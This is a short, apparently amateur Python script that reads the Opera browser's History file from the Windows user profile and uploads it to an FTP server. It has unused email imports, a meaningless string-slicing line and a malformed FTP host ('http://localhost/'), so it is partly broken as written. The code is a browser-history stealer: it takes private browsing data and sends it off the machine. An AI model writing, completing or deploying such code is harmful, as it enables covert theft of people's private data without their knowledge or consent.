from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from ftplib import FTP
import os

hjasd="dsgajhas"
ghj=hjasd[2:5]
print(ghj)

con=FTP('http://localhost/')
con.getwelcome()

path=os.getenv('USERPROFILE')+'\\AppData\\Roaming\\Opera Software\\Opera Stable\\History'
if (os.path.exists(path)):
    with open(path, "rb") as content:
        con.storbinary('STOR %s' % 'history', content)
